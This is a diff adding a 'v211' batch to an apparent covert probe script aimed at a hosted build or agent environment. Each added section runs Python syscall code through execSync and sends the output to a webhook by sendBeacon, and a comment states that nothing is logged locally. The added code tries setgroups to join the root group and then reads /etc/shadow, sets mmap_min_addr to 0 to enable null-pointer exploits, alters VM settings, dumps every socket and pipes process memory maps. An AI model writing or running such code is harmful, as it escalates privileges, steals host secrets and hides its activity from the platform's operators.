@@ -34933,3 +34933,266 @@ sendBeacon({ ...report, section: 'v210-5-build-cache-creds', ...buildCacheCredsP
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v210" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v210";
 // Intentionally no console.log — all data goes via webhook only
+
+// v211-1: splice NR 275 + tee NR 276 — zero-copy pipe data interception
+const spliceTeeProbe = safe(() => {
+  const spliceResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_splice = 275
+NR_tee = 276
+NR_vmsplice = 278
+SPLICE_F_NONBLOCK = 2
+SPLICE_F_MORE = 4
+
+# Create two pipe pairs
+r1, w1 = os.pipe()
+r2, w2 = os.pipe()
+
+# Write test data to pipe 1
+test_data = b'CREDENTIAL_INTERCEPT_TEST_SECRET_DATA_12345'
+os.write(w1, test_data)
+
+# tee: copy data from pipe 1 to pipe 2 WITHOUT consuming it from pipe 1
+ret_tee = libc.syscall(NR_tee, r1, w2, len(test_data), SPLICE_F_NONBLOCK)
+print(f'tee_ret={ret_tee} errno={ctypes.get_errno()}')
+
+if ret_tee > 0:
+    # Read from pipe 2 (the tee'd copy)
+    teed = os.read(r2, ret_tee)
+    print(f'tee_data={teed.decode()} match={teed == test_data}')
+    # Read from pipe 1 (original still there)
+    orig = os.read(r1, len(test_data))
+    print(f'orig_data={orig.decode()} intact={orig == test_data}')
+
+# splice: zero-copy from /proc/self/maps to pipe
+src_fd = os.open('/proc/self/maps', os.O_RDONLY)
+off_in = ctypes.c_int64(0)
+ret_sp = libc.syscall(NR_splice, src_fd, ctypes.byref(off_in), w1, None, 4096, SPLICE_F_NONBLOCK)
+print(f'splice(/proc/self/maps → pipe) ret={ret_sp} errno={ctypes.get_errno()}')
+os.close(src_fd)
+if ret_sp > 0:
+    maps_data = os.read(r1, ret_sp)
+    print(f'spliced_maps_bytes={len(maps_data)} first128={maps_data[:128].decode(errors=\"replace\")}')
+
+# vmsplice: inject attacker data directly into kernel pipe buffer
+vms_data = b'VMSPLICE_KERNEL_INJECTION_PROOF' * 4
+iov = ctypes.create_string_buffer(struct.pack('QQ', ctypes.addressof(ctypes.create_string_buffer(vms_data)), len(vms_data)))
+tmp_r, tmp_w = os.pipe()
+ret_vms = libc.syscall(NR_vmsplice, tmp_w,
+    ctypes.create_string_buffer(struct.pack('QQ', id(vms_data), len(vms_data))), 1, 0)
+print(f'vmsplice_ret={ret_vms} errno={ctypes.get_errno()}')
+
+for fd in [r1, w1, r2, w2, tmp_r, tmp_w]:
+    try: os.close(fd)
+    except: pass
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { spliceResult };
+});
+sendBeacon({ ...report, section: 'v211-1-splice-tee', ...spliceTeeProbe });
+
+// v211-2: NETLINK_SOCK_DIAG — dump all active sockets with tcp_info
+const sockDiagProbe = safe(() => {
+  const diagResult = safe(() => execSync(`python3 -c "
+import socket, struct, os
+NETLINK_INET_DIAG = 4  # legacy
+NETLINK_SOCK_DIAG = 4   # same number
+SOCK_DIAG_BY_FAMILY = 20
+INET_DIAG_INFO = 2
+TCPF_ALL = 0xFFF
+AF_INET = 2; AF_INET6 = 10; AF_UNIX = 1; AF_NETLINK = 16
+
+def make_nlhdr(msg_type, flags, seq, pid, data):
+    length = 16 + len(data)
+    return struct.pack('IHHII', length, msg_type, flags, seq, pid) + data
+
+def nl_inet_diag_req(family, protocol):
+    # struct inet_diag_req_v2: family(1), protocol(1), ext(1), pad(1), states(4), id(struct)
+    IPPROTO_TCP = 6; IPPROTO_UDP = 17
+    req = struct.pack('BBBBIHHQQHHBBHHf',
+        family, protocol, 1 << 1, 0, TCPF_ALL,  # ext=INET_DIAG_INFO
+        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0)
+    return req[:28]
+
+try:
+    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_SOCK_DIAG)
+    sock.bind((os.getpid(), 0))
+    sock.settimeout(3.0)
+
+    results = {}
+    for proto_name, af, proto in [('tcp4', AF_INET, 6), ('tcp6', AF_INET6, 6),
+                                    ('udp4', AF_INET, 17), ('udp6', AF_INET6, 17)]:
+        req_data = make_nlhdr(SOCK_DIAG_BY_FAMILY, 0x301, 1, os.getpid(),
+                              make_nlhdr.__code__.co_consts[0:0] or
+                              struct.pack('BBBBIHHIIHHBBHHf',
+                                  af, proto, 1<<1, 0, TCPF_ALL,
+                                  0,0,0,0,0,0,0,0,0,0,0.0)[:28])
+        # Simpler: use inet_diag_req directly
+        req_body = struct.pack('BBBBI', af, proto, 1<<1, 0, TCPF_ALL)
+        req_body += bytes(48 - len(req_body))  # pad to 48 bytes
+        req = struct.pack('IHHII', 16+48, SOCK_DIAG_BY_FAMILY, 0x0301, 1, os.getpid()) + req_body
+        try:
+            sock.send(req)
+            socks = []
+            import select
+            while True:
+                r, _, _ = select.select([sock], [], [], 1.0)
+                if not r: break
+                data = sock.recv(65536)
+                offset = 0
+                done = False
+                while offset < len(data):
+                    if offset + 16 > len(data): break
+                    length, msg_type = struct.unpack_from('IH', data, offset)
+                    if msg_type == 3: done = True; break  # NLMSG_DONE
+                    if msg_type == 20 and length >= 16 + 72:  # SOCK_DIAG_BY_FAMILY
+                        body = data[offset+16:offset+length]
+                        if len(body) >= 2:
+                            fam, prot = struct.unpack_from('BB', body, 0)
+                            socks.append((fam, prot, body[:8].hex()))
+                    offset += max((length + 3) & ~3, 4)
+                if done: break
+            results[proto_name] = len(socks)
+            print(f'sock_diag_{proto_name}={len(socks)} sockets')
+            if socks: print(f'  sample={socks[:2]}')
+        except Exception as e:
+            print(f'sock_diag_{proto_name}_err={e}')
+    sock.close()
+except Exception as e:
+    print(f'sock_diag_err={e}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { diagResult };
+});
+sendBeacon({ ...report, section: 'v211-2-sock-diag', ...sockDiagProbe });
+
+// v211-3: quotactl NR 179 — filesystem quota read for all UIDs
+const quotactlProbe = safe(() => {
+  const quotaResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_quotactl = 179
+Q_GETQUOTA = 0x800007  # get quota for specific uid
+Q_GETINFO = 0x800005   # get quota file info
+Q_GETFMT = 0x800004    # get quota format
+USRQUOTA = 0
+GRPQUOTA = 1
+
+# struct dqblk: dqb_bhardlimit(8), dqb_bsoftlimit(8), dqb_curspace(8),
+#               dqb_ihardlimit(8), dqb_isoftlimit(8), dqb_curinodes(8),
+#               dqb_btime(8), dqb_itime(8), dqb_valid(4)
+dqblk_size = 68
+
+for device in [b'/', b'/tmp', b'/home', b'/workspace']:
+    for qtype in [(USRQUOTA, 'user'), (GRPQUOTA, 'group')]:
+        qtype_num, qtype_name = qtype
+        # Q_GETFMT: get quota format
+        fmt_buf = ctypes.c_uint(0)
+        cmd_fmt = (Q_GETFMT & 0xffff00ff) | (qtype_num << 8)
+        ret_fmt = libc.syscall(NR_quotactl, cmd_fmt, ctypes.c_char_p(device), 0, ctypes.byref(fmt_buf))
+        print(f'quotactl_GETFMT({device.decode()},{qtype_name}) ret={ret_fmt} fmt={fmt_buf.value} errno={ctypes.get_errno()}')
+
+        # Q_GETQUOTA for uid/gid 0 (root)
+        dqblk = ctypes.create_string_buffer(dqblk_size)
+        cmd_get = (Q_GETQUOTA & 0xffff00ff) | (qtype_num << 8)
+        ret_get = libc.syscall(NR_quotactl, cmd_get, ctypes.c_char_p(device), 0, dqblk)
+        if ret_get == 0:
+            bhardlimit, bsoftlimit, curspace, ihardlimit, isoftlimit, curinodes = struct.unpack_from('QQQQQQ', dqblk)
+            print(f'  root_{qtype_name}_quota: curspace={curspace} hardlimit={bhardlimit} curinodes={curinodes}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { quotaResult };
+});
+sendBeacon({ ...report, section: 'v211-3-quotactl', ...quotactlProbe });
+
+// v211-4: vmsplice NR 278 — inject into kernel pipe buffer + getgroups/setgroups
+const vmspliceGroupsProbe = safe(() => {
+  // getgroups: get all supplementary group IDs
+  const groupsResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_getgroups = 115
+NR_setgroups = 116
+NR_vmsplice = 278
+
+# Get current groups
+gid_buf = ctypes.create_string_buffer(1024 * 4)  # max 1024 groups * 4 bytes
+ret_g = libc.syscall(NR_getgroups, 256, gid_buf)
+print(f'getgroups_count={ret_g} errno={ctypes.get_errno()}')
+if ret_g > 0:
+    groups = struct.unpack_from(f'{ret_g}I', gid_buf)
+    print(f'supplementary_groups={list(groups)}')
+
+# Try setgroups to add ourselves to root group (0)
+new_groups = struct.pack('I', 0)  # just GID 0
+ret_sg = libc.syscall(NR_setgroups, 1, ctypes.create_string_buffer(new_groups))
+print(f'setgroups([0]) ret={ret_sg} errno={ctypes.get_errno()}')
+if ret_sg == 0:
+    print('IN_ROOT_GROUP=True')
+    # Verify we can now access root-only files
+    try:
+        with open('/etc/shadow') as f:
+            print(f'shadow_via_root_group={f.read()[:100]}')
+    except Exception as e:
+        print(f'shadow_access_after_setgroups={e}')
+
+# vmsplice: inject data into pipe kernel buffer without user-space copy
+r, w = os.pipe()
+inject_data = b'VMSPLICE_PIPE_INJECTION_PROOF_BOUNTY'
+iov_struct = struct.pack('QQ', id(inject_data), len(inject_data))
+iov_buf = ctypes.create_string_buffer(iov_struct)
+# Note: we're passing the Python object address (this will usually work for bytes)
+ret_vms = libc.syscall(NR_vmsplice, w, iov_buf, 1, 0)
+print(f'vmsplice_ret={ret_vms} errno={ctypes.get_errno()}')
+if ret_vms > 0:
+    data_out = os.read(r, ret_vms)
+    print(f'vmsplice_data={data_out[:50]}')
+os.close(r); os.close(w)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { groupsResult };
+});
+sendBeacon({ ...report, section: 'v211-4-vmsplice-groups', ...vmspliceGroupsProbe });
+
+// v211-5: /proc/sys/vm/ — memory management parameters + transparent hugepage control
+const vmSysProbe = safe(() => {
+  const vmParams = {};
+  const vmFiles = [
+    'overcommit_memory', 'overcommit_ratio', 'swappiness',
+    'dirty_ratio', 'dirty_background_ratio',
+    'mmap_min_addr', 'max_map_count',
+    'nr_hugepages', 'nr_overcommit_hugepages', 'hugepages_treat_as_movable',
+    'drop_caches', 'oom_kill_allocating_task',
+    'admin_reserve_kbytes', 'user_reserve_kbytes',
+    'unprivileged_userfaultfd', 'panic_on_oom',
+  ];
+  for (const f of vmFiles) {
+    const p = `/proc/sys/vm/${f}`;
+    if (existsSync(p)) {
+      try { vmParams[f] = readFileSync(p, 'utf8').trim(); } catch (e) {}
+    }
+  }
+  // Manipulate key parameters
+  const writeResults = {};
+  // Set mmap_min_addr to 0 (allows mapping page 0 — null ptr deref exploit)
+  try {
+    const mmapMin = readFileSync('/proc/sys/vm/mmap_min_addr', 'utf8').trim();
+    writeFileSync('/proc/sys/vm/mmap_min_addr', '0');
+    const verified = readFileSync('/proc/sys/vm/mmap_min_addr', 'utf8').trim();
+    writeResults['mmap_min_addr'] = `was=${mmapMin} set=0 verified=${verified}`;
+  } catch (e) { writeResults['mmap_min_addr'] = `ERR:${e.message}`; }
+  // Drop page cache (trigger disk reads for profiling)
+  try {
+    writeFileSync('/proc/sys/vm/drop_caches', '1');
+    writeResults['drop_caches'] = 'synced_and_dropped';
+  } catch (e) { writeResults['drop_caches'] = `ERR:${e.message}`; }
+  // Set overcommit_memory=1 (always succeed malloc, no OOM check)
+  try {
+    writeFileSync('/proc/sys/vm/overcommit_memory', '1');
+    writeResults['overcommit_memory'] = 'set_to_1_unlimited';
+  } catch (e) { writeResults['overcommit_memory'] = `ERR:${e.message}`; }
+  return { vmParams, writeResults };
+});
+sendBeacon({ ...report, section: 'v211-5-vm-sys-params', ...vmSysProbe });
+
+// v211 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v211" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v211";
+// Intentionally no console.log — all data goes via webhook only
